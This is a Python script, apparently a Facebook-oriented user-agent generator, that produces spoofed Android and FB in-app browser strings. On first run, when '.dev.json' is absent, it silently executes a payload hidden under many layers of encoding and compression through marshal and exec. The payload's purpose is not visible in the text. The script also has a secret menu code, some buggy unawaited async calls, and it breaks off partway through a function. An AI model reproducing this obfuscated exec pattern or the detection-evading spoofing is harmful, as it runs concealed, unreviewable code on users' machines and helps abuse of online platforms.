import random, os, sys, rich, time, requests, asyncio, aiohttp, datetime,uuid
import binascii, gzip, marshal, zlib, lzma, bz2
from marshal import loads as ld
from datetime import datetime
from rich import print
import json
from rich.panel import Panel
from os import system as sm
from sys import platform as pf
from time import sleep as sp
from random import choice as ch
from random import randint as rand
from concurrent.futures import ThreadPoolExecutor as ter

#decryption
gz,zl,un,se6,bzz,qp,cc,lzz=gzip.decompress,zlib.decompress,binascii.unhexlify,binascii.a2b_base64,bz2.decompress,binascii.a2b_qp,exec,lzma.decompress
try:
  open(".dev.json","r").read()
except FileNotFoundError:
  cc(ld(lzz(gz(un(se6(un(qp(se6(qp(un(se6(un(qp(bzz(se6(un(se6(b'NTE2YzcwNmY0ZjU0NDY0MjU3NTM1YTU0NTc1NDY2NDY2NDYzNmI0MTQzNTI2ZTRhNDE0MTQxNTE2NjJiNDkyZjQxNDc0MTRkMzM3NjUwNmIzODMyNGM3NDc0Njc0YjQ0NTA0ZjM3NjUzOTY0MzczMzRlMzc0YTMxMzY3NjU0NTE1MzU2NDM2YzQzNzUzMzU3NjQ3NTMyNmI3NzZjNGQ2YjMwMzA0OTRhNzE0MjRiNTk1MzUxNzA2OTQxNTUzMDc5NGQ1NDQ1Nzg0MjQzNTU0YTUzNjc0NDUxNDk1MzcxNmU2OTZlNzE2ZTM1NTI0ZTQ3NDU0YjRhNTQ0NTZhNGI2MTZmMzM3MTQzNjg3OTQ0NzA0NjQ3Njg1MjQzNjc0MjJmNGYzMTQyMzc0OTQzNDE2ZDZkNTY2ODUzNmY2YzQ2Mzc2Yzc3NTUzMTUxNjg1MTYxNTU2NDQ2NjQ0MjU4NmI0YjRlNGI0NjQzNDY0OTcyNTE0MjUxNzU0MTRmNmM1MjY3NzE2MjQ5NDEzNjY4NmY0MTZkNzc3MTU1NDc2YjM5Nzg1NjU4MmI0ZDUxMmIzNzY3NmM1MjVhNDMzNTMyMzI1NDUxNzg0YTU0NDU0NjYzNzg3NDc2NTA0OTczNTY1MTdhMzk2ZTUzNTU0ZjZiMzM1NDYxNjk1MTRjNzQ2OTYxNGI0ZjY0MzQ2ODc5NmIzNTcyMzI1MDM2NmE2ZDczNjM2OTc5NzY0ODY5Njc3MTcxNmQzNTQ1Njg3NTMxNTc3MTUyNDM3MTU4NTY3MjZjNTEzNzcxN2E0Yzc4NmIzMzY4NzEzMzU4NzU3OTQ0NDk2NzY1NTQ1ODZhNjk2MjRkNjE3MjVhNTg3YTY0NGU0ZjUxNjQ3MzZjNGY0NTRmNTE0Njc0NzU3MzUzNTY0ZTRkNTI1NTMwNmM1MjQ2NDYyYjU5MzE2NDJiNGU2MjVhNzE2MjUyNTY2ODM1NmYzNzY0NzU2YTM4Njg2NTMyMzQ0ODc4NDc2ZTYxNGM0MjZmNzQ1MjcwNDc1NDc1NzUzMjRlNzI0ZjRmMzM1NzQ3NDEzNDdhNTE2NTMzNjU2NjZmNTA3OTQ1NzA0MTM2NjI1NTc4NzM2ZDQxNTI1NTU2MzAzNDVhMzI0YTQ2NDg1YTZkNGY3MzYzNTkzMjY0N2E2YjRkNDU2ZTQ3NDIzMzMyNzEzNzRkNzY2NjUxNGY1NDcxN2E3OTQ3NGQ1NTY2NmIzNDMwNmQ0OTZmNzc1MzY0NmMzOTM5NTM1NTc4NTE0OTY1MzI3MDcxNjUzMzY1NGQ1NzY3NGY0MTcwNjQ2NzU4NmY3NTM3NDEzMzUwMzQ1MjJmNTc0MTRhNDQ0ZDY4NmI1MDQyNjk3MDU1NmQzODZiNjQ1MDZhMmYzMjY0Njc3ODYzNzk2MjUxNjE2YTQ1NTg0ZjYzNGI0YTc0Mzg3NjUxMzk2MzQxNGU2MTUwNjU3YTc4NzE0YTQ5NjM1MzQ5NTE0NTc4NTg2YjUwNTQzOTQ2NDk2NDUyNmYzODZiNjgzNjU1NGQ3NDQyMzY0MTczNDg1MjUzNGYzMjJmNjk0MTJiNWEzMDYxMzk0ZjY4NTc2YjMwNDE2ZTQ2NjI2YjU1NDY0OTZjNDM1MjRlNDY0ZDUyNTU3NzU2NTQ0YzQ2N2E1OTZmNGI0MzQxNmY3MTY5NTk2MTRiNDM2YzYxNmY3MDcwNWE2OTY5Njk2YjY5NmY0YjUzNmQ0NTZkNjE0YjZkNzA2ZDRiNDM0YjZiNjkzMTcwNmI2YTM4NTA3NDVhNTA2ZDY1Nzk0YTMxNmQ2ZDMxNzY2YTQ5NTU0ODRmNDI0ODUwNmY2NTYxMzQ1NjU4NTI2NzMzNTQ1YTMyMzAzNTU5NmIzOTUxN2EzODM2NTU3MTY4NDk3MTUzNDc2ODY5NDM1MTY3MmI3OTQ3NjE2MTU5Njg2ZDUzNmM2OTcxNjg0YjQzNDk3MTQzNDM0OTZmNGI1MzZmNjE2YzMyNjM0NjQ5MzYzNTRlNGIzODUzNzE1NTY4NzA2ZDRiNmQ0ZjYyNGQ2YTQzNTM2MTU3NmI3ODQyNGI0NjUyNTUzMTQ1MzA3YTU2NDI0NjQ1NzQyYjRiNmQ3NzZkNjc1YTQ5NjI0YTQyNGMzNjQ1Mzk2Nzc2NDk0NTQzNjc0MjM4NGQzMTc5NDQ3NTQ0NDU2YjRiNDE2MTZjNTI2YjY5NDQ0MjQxMzYzNDY5MzU1MTU5MzM3MTYyNDQ0YTU3NjYzMzY0NjY1OTMyNmUzNjU2MmI2ZTRlMzk1OTY1NzMzNjc5NjI0NzQzNDU2NzU1NDk1NTQ0NTU0OTUwNDU3NzMzMmY2MTM1N2E2MzYyMzMzNTQ4MzU0MTM3NmM2NjQzNDUyZjMxNzk3NjRkNjM0MzM5Nzc3NjQ1NTM0YzQ5NTM0YTczNGM3NTcxNGQ1NTU0NTE1NjUxNTgzMjY0NzI0MjUyNTE0OTUxNTE2YjRhNDM1MTQ1MmIzOTU4NWE3OTQ0NDM3MDc0NzA0NDYyNDU0MzczNGU3NjZjNGQ2MTRiNmIzMjc1NmUzOTQ5Njk1NzM3NDM2MzM2NGE2ZTZjNDk1MjcwNzQ3MjY3MzM3Njc5NjQ1MjYzMzk1NjY1MmY3NjUyN2E2ZjM2NTQ1NTRhMmI1MTU0NTU1NDZkNDEzOTM4MzkzNjYyNzU0MTY1Nzk2NDRjNDk1ODcyN2E0ZDMyMzM1OTZiNjk2ZTcyNDQ3MzU3NDc2YTdhNzY1YTYzNTc0OTUyMzc3NzQ4Mzg2ZTc2NTg2ZTc2NWE0ZTc5MzM2NjMzNzU2Yjc4NTU0NjUyNDUzMDUyMzk1YTRiNjE3MTQzNjUyYjc2MzU3NjcxNzg0NzRiNGY0NDZiNjY2Zjc0NGU0YzUyNDU2MjY3NDMzMDQ5NGI0YTM4NGE2ODRhNDE3MTY4NGM1ODRhNzA1Mzc2NDU1Njc3NjE2MTY0Njk3ODQ3NmE2MTQ1NjE3NTcxMzMzMDc2Njk0MjY0NzkzODcyNTM0ZTUzNGE3NDQ3MzE3YTc4NzQ2NDM5NjQ3YTc2NjY2MjQ5NzA3NzMxMzc3OTdhNTg2ZDZlNDI1NTZlNmU0ZTc1NzE1MTY2NGY1MDQ1NDQ1MDU4NTI3NjY3MzEzMDY1NGMzNzQyMzY2NTM3NTg0YTU3MzE3NDZmNGQ1NjU1Nzg1MjQ2NjQ0YTQ1Njg0MjQ1Nzg0YTQ2NGEzNTMxNTYyYjc3NTQ2NDMzNTczODY3MmI3MTQzNDg1ODQ4NGE0NjcxNzA3MDcyNTM3OTRiNTI1MDM2Nzc0ZjY0NmY1NzY1NDQ1OTMwNGU0MjUxMzg2MTM5NDY0ZjQ0NjE0Mjc0MzE1OTYzNTk1MzUwNTQzMDQ3NTc0YTU5Nzg3MzczNzE3YTY1NzM3NDRkNDM0YTYxMzEyZjY0NTUyYjM5MmI2YTY1NzY3MTMzMzM1MzRiMmI0ODc5NzI0ZjYxNmU2MjM3NmE3MTRiNGEzODMyNDg3MjY1NDM2NTY4NmY3Nzc5Mzk3MjJiNDg1NTQ4NTkzNDMwNmY0MzU0Njk0NjM1NjMzNDc4Nzg2YTc4NGQ3YTU3Mzk1MjQ3MzQ0OTcyNTE2NzMyNzc2MTM2NGY2NTZlNTE0NDZlNzg1MDcyNDk0ODUyNDU2NTMzNTA0YTRkNjg2OTUxMzE3OTRkNTUzMTUzNzA3MTYxNmY2OTRhMzY3MzQzMzY1MTY4Njc2MzcyNDM2NTQzNTQ2Nzc4NDU0ZjdhNTQ1MzU1NmY1MjQ0NDUzMTUzMzAzMTU2NGE1MTU1NTU0NjQ2Mzc0OTU5NzE1NzMyNzg1MjQ1NzkzMTM2NTU0NTUxNTY0NTc0NGE1MzczNDU3MTZiMzA3MDQ1MzA0NTUxNTY1NDUzNmI1MTM4NzM0OTU1NTE3NzMxNDE1MjZmNDQ0MzQ2NzM3NDRmNmQ0OTVhNDc0MzU3NGI1OTZmNTU2ZjUxNGMyZjQxNGMyZjRlMzU0MjU1NjY0YTc3NGE0YTMyNjM3NDMzNGU3OTczNjMyYjMyMzU0MjcyNzY2NTYzMmY0YjVhMzUzNzcwNTY1MDQzNzg0NDcwNzY1ODRjNjU1OTY4Njk2OTY3NzEzNzU5NjczOTc4NzI2YjcyNTE3Mjc4NDQ0MjU5MzEzNDc1NTI3NzRjNmI2NTRmNTY0ZTZmNzM0NzRjNjM3MTM1NzU2Mzc2NTQzMjU0MzM2Zjc1NTk3ODUzMzY0ZDQ3NmI2ZDU4NzgzNzc3Mzk3MDU4Njc0MjRhNDU2NzY0MzU3MzMwNDg2ZjYzNGQ0YTc3MzM1NTc3MzYzMzYyNmYzNjQ4NDM3NTc1NjIzODU2NTQzMzM0NTM0MjUzNjE1YTUxMzA0NjQxNTI0NjQ4NmI0NzU2NGE3MTc1NjI0Yzc1Nzk1YTQxNTk0OTUxNzk0Zjc4Njc0NTU2NDU0OTUxNjM0NTY3NzE3MDU5MzE1MjY4NjczNTQ5MzQ2YzcwNjk0OTZjNTUzNDc4Nzk2MTUxNzg3YTYxNGU0NTU2NjM3NDQ3Njc2NjZiMzA0YjY1MzA0Mjc5NDY0ZDZhNTM2OTZiNmY3MTRiNDM2ZDRiNWE0YTY3NGI0YjZmNmY2ZjZmNGM3ODQ1NzM2ZTY5NzA2OTU0Mzc2ODY2NDUzNzZlNWE0ZTQ0NDk1MDMyNjM2ZTRkMzEzMTMzNmM2OTU2Nzk0ZDYzN2E0YTRmNGM0NDZjNmI1NDc0NzkzNDUwNzk1MTcwMzY1NjJiNTk2ZTcxNjU3NTJmNTIzNTY1Nzk3Njc4MzA3NTY1NzY1NDM3Mzk1YTQ5NTkzOTZmNTM1MTZiNDM0ODZiNjc0YTc4NTQ2ODQ5NmI1MTU0NjM0ZDQxMzE1NzMxNDg0MzQyNDQ0NjcxNDU2ZjU1Mzg1NTYzNDQzMzY4NTIyYjZhMzY1NDZiNjMzMDc0MzM0NzRmMzQzMzRkNzQ1ODU1NzQ1MjU1NmM0YzQ1MzQ2ZDc3NjE1MjUyNzE2ODcwNDcyYjczMzkyZjY4N2E1MDUyNDg1MDY5NTc0OTUzNDc1MTY1NmU1MjMxNDQ3OTMxMzQ0YTQ5NTU0NzU4NDE3YTQ2NjM0MjZmNDQ2ZDZiMmI0NjUwNmU2ZjQ1NGEzOTY0NTU2ODYxMzY0YTY5Nzc0MTZkNzk0ODQ1NDYzNTY5NDY1OTQ0MzQ0NDM0NzY1MjRjNTY0YjU2NGM2NjY3NDQzMzQxNmQ3MTZhNmI0MzRlNDM0MjY5NDU2NTc4NDg2ODQxNDg3ODQzNmE0NjQ1Nzg1MjZkNzE2NzQ3NDY0YjM1NzkzMzUzNDM0YTUxNGYzNTQxNjM2NzY1NmY2NjdhNzMzNDcwMmY3MDc5NGY0NzM4NzQyYjc0NTY3NTQ4NDQ3NTRmNjI1MDc1Mzc1NDYyNGE3MDY1NjY2NjYzNTMzNzZlMzYyYjUwNzg2ZDQ0Njk0NzUzNTMzNzc1NDY3MjZjNTQ1MjY0MzY3MDY5NTI3YTRlMzA0ZjZlNmQ0YTMwNzY1NzRlNDM0NzMyMzI0ZTQ5NDI2ZjQyNTE1MjRmNGQ2OTY5Mzc3OTVhNjc1MTY3NTY1NzM1MzE3NzcxNDU2NjZmNzAzMDcwNDM2YjU2NjI1OTcxNjE0YjUyNjc0NzQzNTE0MzZmNmU2ZjM4NDk2YjY1NDk0NDRjNDM3ODQ5NmI2NzYzNDIzMTUzNjE2YzcxNmQ1MTU0NDM0MzM4NDM0ODczMzA2MTVhNGE0OTMxNDQ2MjY5NDU2MjUzMzQ1MDZkN2E0MjQ5MmIzMDMyMzI1NzYyMzY1OTUzNjQ0YjZhNDc2MTUzNGMyZjRiNjQ2NTJmNjI3MjRmNDIzMzU5NzE1MjcyMzc2YjUwNzY0NzY1NmI3NzcxMzk2NjVhNTg1MDRlNjM3NzU2NzM2ZTJiMmY2MzJmNzY1MjM1MzEyYjZkNmE3NTUyNDU0NzZmNmQ3MTJmMmI2ODQ4Njc0YjM1Njc0YzUxNTU0NDcyNzA0MTQ2NGIzODY4NDc2ODQyMzA3NzUyNTE0ZDQ3NmU0YTQ1NDk3ODRhMzc1OTVhNzA1NzY3Njc2YjcxNDk1YTYxNDk3MDcxNjk2ZjZkNzE2OTcyNjc3MDc5NTI0MTMwNTQ1NTQ5Njk2NzcyNmM2NzMxNmI1OTQ4Njg1YTUzNTY0OTZkNjc2YTQzNDQ3MzQzNTk0NzM0Mzc0MTYxNTE1MjcwNGY1OTZmNjI0YjQ2NDM2NzU1NDM0NjQxNjgzNzM2NTI0NTMyNDEzMTQ1Njg0YTQyNTk0NTc5NDU0ODUzNGM2ZjU2NTM2ODUxNGI0NTQ3NmM3MDZmNDU3MDU2Nzg0YjZkNmM1MTcwNDY2MTU1NmY0MjU3Njc1MTcwNDE1NzZjNDU1MzZiNTE2MTUxNDE3MDQyNGI0NTQzNmI1MDMwNTg2MzZiNTUzNDU1NGE0MTMzNzg1ODU4NGEwYQ==\n'))))))))))))))))))
  print("[bold cyan]Pls Run Again")
  exit()
#colors
r="[bold red]"
g="[bold green]"
y="[bold yellow]"
b="[bold blue]"
m="[bold magenta]"
p="[bold purple]"
c="[bold cyan]"
v="[bold violet]"
w="[bold white]"
#border_style
def border_color():
    border=random.choice(['bold magenta','bold purple','bold violet'])
    return border
#Color Randomizer
def color():
    random_color=ch([r,g,y,b,m,p,v,c,w])
    return random_color
#logo
def logo():
    print(Panel(f"""{color()}    db    db  .d8b.          d888b  d88888b d8b   db
    88    88 d8' `8b        88' Y8b 88'     888o  88
    88    88 88ooo88        88      88ooooo 88V8o 88
    88    88 88~~~88 C8888D 88  ooo 88~~~~~ 88 V8o88
    88b  d88 88   88        88. ~8~ 88.     88  V888
    ~Y8888P' YP   YP         Y888P  Y88888P VP   V8P        """,subtitle="[bold yellow]UA GENERATOR [bold cyan]By:[bold red][u]PABLO[/u]",border_style=f"{border_color()}"))
#clear
def clear():
    if pf in ['win64','win32']:
        sm('cls')
    else:
        sm('clear')
    logo()

#main
async def main():
    clear()
    print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] MBASIC METHOD UA\n[bold yellow][[bold cyan]2[bold yellow]][bold green] Dalvik UA\n[bold yellow][[bold cyan]3[bold yellow]][bold green] FBAN UA\n[bold yellow][[bold cyan]4[bold yellow]][bold green] MIX UA\n[bold yellow][[bold cyan]0[bold yellow]][bold red] EXIT",border_style=f"{border_color()}"))
    try:
      select = int(input(" \033[1;36mChoose Number: \033[1;33m"))
    except ValueError:
      sys.exit("\033[1;31mWrong Value Fool, Stupid, Imbecile, Lunatic, Idiot")
    if select == 1:
        try:
            num = int(input(" \033[1;36mHow Many Ua? \033[1;33m"))                                          
        except ValueError:                              
            print("[bold red] String Not Allowed, Only Integers[/]")                                                
            sp(5)                                       
            main()
        mbasic(num)
    elif select == 2:
        try:                                            
            numm = int(input(" \033[1;36mHow Many Ua? \033[1;33m"))                                                  
        except ValueError:                              
            print("[bold red] String Not Allowed, Only Integers[/]")                                                
            sp(5)                                       
            main()
        dalvik(numm)
    elif select == 3:
        try:                                            
            nummo = int(input(" \033[1;36mHow Many Ua? \033[1;33m"))                                         
            
        except ValueError:                              
            print("[bold red] String Not Allowed, Only Integers[/]")                                                
            sp(5)                                       
            main()
        fban(nummo)
    elif select == 4:
      clear()
      print("[bold red]ONLY ADMIN CAN USE THIS FUNCTION, FOOL")
    elif select == 7232004:
      try:
        nummm = int(input(" \033[1;36mHow Many Ua? \033[1;32m"))
      except ValueError:
        print("[bold red]String Not Allowed, Only Integers")
      mix(nummm)
    else:
        exit()

#methods
def mbasicrand():
  mn=[]
  xx=open(".dev.json",'r').read()
  bnb = json.loads(xx)
  for bnbm in bnb:
        if "GT-" in bnbm['model'] or "RMX" in bnbm['model'] or "SM-" in bnbm['model'] or "itel" in bnbm['model'] or 'TECNO' in bnbm['model'] or 'M200' in bnbm['model'] or 'CPH' in bnbm['model'] or 'ZTE' in bnbm['model'] or "Huawei" in bnbm['model'] or "HUAWEI" in bnbm['model'] or "Redmi" in bnbm['model'] or "vivo" in bnbm['model'] or "Nokia" in bnbm['model'] or "Meizu" in bnbm['model'] or "meizu" in bnbm['model'] or "MEIZU" in bnbm['model'] or "ASUS" in bnbm['model']:
            mn.append(bnbm['model'])
  modelsss=random.choice(mn)
  if "GT-" in modelsss:
    android_ver=random.choice(['4.4.2','4.4.4','4.0.2','5.1.1','4.4.2','5.0.1','5.0','5'])
    ranbuild=f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
  else:
    android_ver=random.randint(5,14)
    ranbuild=random.choice([f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}",f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}"])
  aa=f"Mozilla/5.0 (Linux; Android {android_ver};{random.choice(['',' en-us;',' en-US;',' en-ph;',' en-PH;'])}"
  #b=random.randint(6,12)
  qp1a=f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}"
  fff=f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
  #ranbuild=random.choice([qp1a,fff,"",""])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(90,117)
  i='0'
  j=random.randrange(4000,6000)
  k=random.randrange(30,150)
  l='Mobile Safari/537.36'
  n=f"[FB_IAB/{random.choice(['FB4A','MESSENGER','Orca-Android'])};FBAV/{random.randint(80,410)}.0.0.{random.randint(10,25)}.{random.randint(100,300)};]"
  m=f"[FBAN/{random.choice(['EMA'])};FBLC/en_US;FBAV/{random.randint(80,410)}.0.0.{random.randint(10,30)}.{random.randint(100,200)};]"
  o=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) Gecko/114.0 Firefox/{random.randint(60,122)}{random.choice(['.0','.1'])}"
  p=f"OPR/{random.randint(60,68)}.0.{random.randint(3000,3500)}.{random.randint(10000,65000)}"
  pp = f"XiaoMi/MiuiBrowser/{random.randint(7,16)}.{random.randint(1,9)}.{random.randint(1,15)}"
  ppp=f"XiaoMi/Mint Browser/{random.randint(1,3)}.{random.randint(1,9)}.{random.randint(0,3)}"
  phonix=f"PHX/{random.randint(1,14)}.{random.randint(1,9)}"
  fireff=f"Firefox/{random.randint(60,122)}{random.choice(['.1','.0'])}"
  q=random.choice([n,m,p,pp,ppp,phonix,fireff,""])
  samsungg=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{random.randint(10,24)}.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36"
  ucbrowser=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 UCBrowser/{random.randint(11,13)}.{random.randint(1,6)}.{random.randrange(1,4)}.{random.randint(950,1500)}"
  edgee=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,9000)}.{random.randint(30,150)} Mobile Safari/537.36 EdgA/{random.randint(90,117)}.0.{random.randint(1000,9999)}.{random.randint(30,150)}"
  huaweiii=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} HuaweiBrowser/{random.randint(10,15)}.0.{random.randint(1,9)}.{random.randint(250,310)} Mobile Safari/537.36"
  viboo=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 VivoBrowser/{random.randint(9,18)}.{random.randint(0,1)}.{random.randint(0,99)}.{random.randint(0,4)}"
  heytapp=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 HeyTapBrowser/{random.randint(30,50)}.{random.randint(1,9)}.{random.randint(1,5)}.1.1"
  yand=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} YaBrowser/{random.randint(20,24)}.{random.randint(1,9)}.{random.randint(1,9)}.{random.randint(20,250)} Mobile Safari/537.36"
  fullagent=(f'{aa} {modelsss}{ranbuild}) {g}{h}.{i}.{j}.{k} {l} {q}')
  fullyage=random.choice([fullagent,samsungg,o,huaweiii,ucbrowser,edgee,viboo,yand])
  return fullyage
def mbasic(limit):
    mn=[]
    xx=open(".dev.json",'r').read()
    bnb = json.loads(xx)
    for bnbm in bnb:
        if "GT-" in bnbm['model'] or "RMX" in bnbm['model'] or "SM-" in bnbm['model'] or "itel" in bnbm['model'] or 'TECNO' in bnbm['model'] or 'M200' in bnbm['model'] or 'CPH' in bnbm['model'] or 'ZTE' in bnbm['model'] or "Huawei" in bnbm['model'] or "HUAWEI" in bnbm['model'] or "Redmi" in bnbm['model'] or "vivo" in bnbm['model'] or "Nokia" in bnbm['model'] or "Meizu" in bnbm['model'] or "meizu" in bnbm['model'] or "MEIZU" in bnbm['model'] or "ASUS" in bnbm['model']:
            mn.append(bnbm['model'])
    for agent in range(limit):
        modelsss=random.choice(mn)
        if "GT-" in modelsss:
            android_ver=random.choice(['4.4.2','4.4.4','4.0.2','5.1.1','4.4.2','5.0.1','5.0','5'])
            ranbuild=f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
        else:
            android_ver=random.randint(5,14)
            ranbuild=random.choice([f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}",f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}"])
        aa=f"Mozilla/5.0 (Linux; Android {android_ver};{random.choice(['',' en-us;',' en-US;',' en-ph;',' en-PH;'])}"
        #b=random.randint(6,12)
